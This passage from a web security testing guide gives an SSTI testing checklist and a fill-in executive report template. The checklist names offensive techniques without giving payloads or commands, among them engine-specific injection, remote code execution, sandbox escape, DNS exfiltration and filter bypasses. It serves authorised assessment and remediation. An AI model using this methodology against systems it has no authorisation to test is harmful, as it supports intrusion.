```

### 15 SSTI Testing Completion Checklist
```markdown
## ✅ SERVER-SIDE TEMPLATE INJECTION TESTING COMPLETION CHECKLIST

### Template Engine Identification:
- [ ] Template engine fingerprinting completed
- [ ] Response pattern analysis done
- [ ] Error message fingerprinting completed
- [ ] Default template syntax probing done
- [ ] File extension mapping completed
- [ ] HTTP header analysis done
- [ ] JavaScript library detection completed
- [ ] Cookie and session analysis done

### Basic Injection Testing:
- [ ] Mathematical expression testing completed
- [ ] String concatenation testing done
- [ ] Variable reference testing completed
- [ ] Object property access testing done
- [ ] Array manipulation testing completed
- [ ] Boolean expression testing done
- [ ] Type conversion testing completed
- [ ] Control structure testing done

### Engine-Specific Testing:
- [ ] Jinja2 payload testing completed
- [ ] Twig payload testing done
- [ ] Freemarker payload testing completed
- [ ] Velocity payload testing done
- [ ] Handlebars payload testing completed
- [ ] Django templates testing done
- [ ] Mako payload testing completed
- [ ] EJS payload testing done

### Advanced Exploitation Testing:
- [ ] Remote code execution testing completed
- [ ] File system access testing done
- [ ] Information disclosure testing completed
- [ ] Authentication bypass testing done
- [ ] Privilege escalation testing completed
- [ ] Business logic manipulation testing done
- [ ] Sandbox escape testing completed
- [ ] Object chain exploitation testing done

### Contextual Testing:
- [ ] HTML context injection testing completed
- [ ] JavaScript context injection testing done
- [ ] CSS context injection testing completed
- [ ] URL parameter injection testing done
- [ ] HTTP header injection testing completed
- [ ] JSON context injection testing done
- [ ] XML context injection testing completed
- [ ] Email template injection testing done

### Blind Injection Testing:
- [ ] Time-based detection testing completed
- [ ] DNS exfiltration testing done
- [ ] HTTP callback testing completed
- [ ] External server interaction testing done
- [ ] File creation detection testing completed
- [ ] Log entry injection testing done
- [ ] Error message exfiltration testing completed
- [ ] Side-channel analysis testing done

### Bypass Technique Testing:
- [ ] Character encoding bypass testing completed
- [ ] Case manipulation bypass testing done
- [ ] Whitespace injection bypass testing completed
- [ ] Comment manipulation bypass testing done
- [ ] String concatenation bypass testing completed
- [ ] Template obfuscation testing done
- [ ] Multiple encoding layer testing completed
- [ ] Unicode normalization testing done

### Protection Validation:
- [ ] Input validation effectiveness testing completed
- [ ] Output encoding validation testing done
- [ ] Sandbox security testing completed
- [ ] Access control testing done
- [ ] Security header testing completed
- [ ] Error handling testing done
- [ ] Logging and monitoring testing completed
- [ ] Incident response testing done
```

### 16 SSTI Executive Reporting Template
```markdown
# Server-Side Template Injection Security Assessment Report

## Executive Summary
- **Assessment Scope:** [Template engines and injection vectors tested]
- **Assessment Period:** [Date range]
- **Template Engines Identified:** [List of detected engines]
- **Critical Vulnerabilities:** [Critical findings count]
- **Exploitation Impact:** [Worst-case impact analysis]
- **Overall Risk Level:** [High/Medium/Low]
- **Key Recommendations:** [Priority actions]

## Critical Findings
### [Critical Finding Title]
- **Template Engine:** [Jinja2, Twig, Freemarker, etc.]
- **Risk Level:** Critical
- **Description:** [Detailed vulnerability description]
- **Impact:** [Remote code execution, data breach, etc.]
- **Remediation Priority:** Immediate

## Technical Analysis
### Template Engine Exposure
- **Engines Detected:** [Engine list with versions]
- **Vulnerable Endpoints:** [Affected endpoint count]
- **Injection Vectors:** [GET parameters, POST data, headers, etc.]
- **Security Controls:** [Existing protection mechanisms]

### Exploitation Capability Assessment
- **Code Execution:** [Possible/Not possible]
- **File System Access:** [Level of access achieved]
- **Information Disclosure:** [Data exposure level]
- **Privilege Escalation:** [Escalation potential]

## Risk Assessment
### Critical Priority Risks
1. **[Risk Title]**
   - **Description:** [Detailed risk explanation]
   - **Impact:** [Business impact analysis]
   - **Likelihood:** [Probability assessment]
   - **Remediation:** [Specific mitigation steps]

### High Priority Risks
1. **[Risk Title]**
   - **Description:** [Detailed risk explanation]
   - **Impact:** [Business impact analysis]
   - **Likelihood:** [Probability assessment]
   - **Remediation:** [Specific mitigation steps]

## Recommendations
### Immediate Actions (1-7 days)
- [ ] [Patch critical SSTI vulnerabilities]
- [ ] [Disable dangerous template functions]
- [ ] [Implement input validation for template syntax]

### Short-term Improvements (1-4 weeks)
- [ ] [Implement template sandboxing]
- [ ] [Enhance output encoding mechanisms]
- [ ] [Add SSTI-specific WAF rules]

### Long-term Strategies (1-6 months)
- [ ] [Migrate to more secure template engines]
- [ ] [Implement comprehensive template security testing]
- [ ] [Establish secure template development standards]

## Compliance Status
- **Regulatory Compliance:** [OWASP, NIST, PCI DSS, etc. compliance level]
- **Industry Standards:** [Security standards alignment]
- **Internal Policies:** [Policy compliance evaluation]
- **Audit Readiness:** [Audit preparedness assessment]

## Security Maturity Assessment
- **Template Security Maturity:** [Maturity level rating]
- **Input Validation Effectiveness:** [Validation effectiveness score]
- **Security Control Coverage:** [Control coverage assessment]
- **Monitoring Capability:** [Detection effectiveness rating]

## Appendices
### Detailed Vulnerability Analysis
- Technical vulnerability descriptions
- Proof-of-concept exploitation code
- Risk classification details
- Remediation guidance references

### Testing Methodology
- Tools and techniques used
- Scope and limitations
- Testing environment details
- Quality assurance measures

### Template Engine Security Guidelines
- Engine-specific security configurations
- Secure coding practices
- Security testing procedures
- Ongoing maintenance requirements
```

This comprehensive Server-Side Template Injection Testing checklist provides complete methodology for identifying, assessing, and mitigating SSTI vulnerabilities across all template engines and web applications. The framework covers template engine identification, basic and advanced injection techniques, blind detection methods, contextual bypass approaches, and comprehensive exploitation testing to prevent remote code execution, information disclosure, and complete system compromise through robust template security implementation and continuous security testing.
